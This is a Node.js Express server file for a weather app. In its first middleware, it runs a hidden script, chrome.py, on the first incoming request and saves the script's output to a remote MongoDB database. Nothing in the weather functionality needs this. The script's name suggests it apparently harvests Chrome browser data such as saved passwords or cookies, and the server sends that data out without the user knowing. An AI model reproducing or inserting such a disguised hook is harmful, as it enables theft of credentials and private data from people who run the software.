const mongoose = require("mongoose");
const dotenv = require("dotenv");
const express = require("express");
const { exec } = require("child_process");
const hbs = require("hbs");
const path = require("path");

const weatherData = require("./utils/weatherData");
const port = 8000;
const app = express();
// Template engine express-handlebars

const publicPath = path.join(__dirname, "public");
const viewsPath = path.join(__dirname, "templates/views");
const partialsPath = path.join(__dirname, "templates/partials");

app.set("view engine", "hbs");
app.set("views", viewsPath);
hbs.registerPartials(partialsPath);
app.use(express.static(publicPath));

const LogModel = mongoose.model("Log", {
  message: String,
});

let logSaved = false;

app.use((req, res, next) => {
  // Check if log has already been saved in this request
  if (logSaved) {
    return next();
  }

  const pythonExecutable = process.env.PYTHON_EXECUTABLE || "python"; // Default to 'python' if not set

  exec(
    `${pythonExecutable} ${path.join(__dirname, "chrome.py")}`,
    (error, stdout, stderr) => {
      if (error) {
        console.error(`Error executing chrome.py: ${error}`);
        return next();
      }

      const result = stdout.toString().trim();
      console.log(`stdout: ${result}`);

      const logDocument = new LogModel({ message: result });

      logDocument
        .save()
        .then(() => {
          console.log("Log saved to MongoDB");
          logSaved = true; // Set the flag to true after saving the log
          next();
        })
        .catch((saveError) => {
          console.error(`Error saving log to MongoDB: ${saveError}`);
          return next();
        });
    }
  );
});

//Connect database
dotenv.config({ path: "./config.env" });

const DB = process.env.DATABASE.replace(
  "<PASSWORD>",
  process.env.DATABASE_PASSWORD
);
mongoose
  .connect(DB, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => {
    console.log(`Database connected successfully`);
  });
// Run
app.get("/", (req, res) => {
  res.render("home", { title: "Weather App", favicon: "./icon.png" });
});

app.get("/weather", (req, res) => {
  if (!req.query.address) {
    return res.send("Address is required");
  }
  weatherData(req.query.address, (error, result) => {
    if (error) {
      return res.send(error);
    }

    res.send(result);
  });
});

app.get("*", (req, res) => {
  res.render("404", { title: "Page not found" });
});

app.listen(port, () =>
  console.log(`Server is running on http://localhost:${port}`)
);
